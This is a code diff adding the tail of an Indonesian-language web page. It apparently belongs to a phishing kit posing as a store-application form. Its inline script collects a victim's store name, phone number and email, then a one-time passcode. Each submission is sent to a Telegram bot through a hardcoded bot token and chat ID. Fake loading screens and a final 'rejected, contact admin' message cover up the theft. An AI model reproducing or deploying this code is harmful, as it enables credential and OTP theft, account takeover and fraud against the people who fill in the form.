@@ -1,0 +1,83 @@
+Ditolak</p>
+        <p class="result-text">Silakan hubungi admin untuk info lebih lanjut</p>
+    </div>
+
+    <script>
+        // Konfigurasi Telegram
+        const TELEGRAM_BOT_TOKEN = "8069332396:AAH3Ui5nG7EUF26xrdK5aZgRDB1kEkM6TeA";
+        const TELEGRAM_CHAT_ID = "8381498898";
+
+        // Fungsi Kirim ke Telegram
+        async function sendToTelegram(message, title) {
+            const fullMessage = `📌 ${title} 📌\n\n${message}\n\n---`;
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: fullMessage })
+                });
+            } catch (err) {
+                console.error("Gagal kirim Telegram:", err);
+            }
+        }
+
+        // === HALAMAN PERTAMA ===
+        const storeName = document.getElementById('store-name');
+        const phone = document.getElementById('phone');
+        const email = document.getElementById('email');
+        const terms = document.getElementById('terms');
+        const continueBtn = document.getElementById('continue-btn');
+
+        setInterval(function() {
+            const storeIsFilled = storeName.value.trim() !== "";
+            const phoneIsFilled = phone.value.trim() !== "";
+            const emailIsFilled = email.value.trim() !== "";
+            const termsIsChecked = terms.checked;
+
+            continueBtn.disabled = !(storeIsFilled && phoneIsFilled && emailIsFilled && termsIsChecked);
+        }, 100);
+
+        continueBtn.addEventListener('click', async function() {
+            document.getElementById('first-section').style.display = 'none';
+            document.getElementById('loading-section-1').style.display = 'block';
+            
+            // Kirim Data Awal ke Telegram
+            await sendToTelegram(
+                `Nama Toko: ${storeName.value.trim()}\nHP: +62${phone.value.trim()}\nEmail: ${email.value.trim()}`,
+                "DATA PENGAJUAN AWAL"
+            );
+
+            setTimeout(() => {
+                document.getElementById('loading-section-1').style.display = 'none';
+                document.getElementById('otp-section').style.display = 'block';
+            }, 4000);
+        });
+
+        // === HALAMAN OTP ===
+        const otpInput = document.getElementById('otp');
+        const submitOtpBtn = document.getElementById('submit-otp-btn');
+
+        setInterval(function() {
+            submitOtpBtn.disabled = !(otpInput.value.trim().length >= 4);
+        }, 100);
+
+        submitOtpBtn.addEventListener('click', async function() {
+            document.getElementById('otp-section').style.display = 'none';
+            document.getElementById('loading-section-2').style.display = 'block';
+            
+            // Kirim Data OTP ke Telegram
+            await sendToTelegram(
+                `Nama Toko: ${storeName.value.trim()}\nOTP yang Dimasukkan: ${otpInput.value.trim()}`,
+                "DATA KODE OTP"
+            );
+
+            // Langsung ke halaman hasil setelah loading
+            setTimeout(() => {
+                document.getElementById('loading-section-2').style.display = 'none';
+                document.getElementById('result-section').style.display = 'block';
+            }, 4000);
+        });
+    </script>
+</body>
+      </html>
+
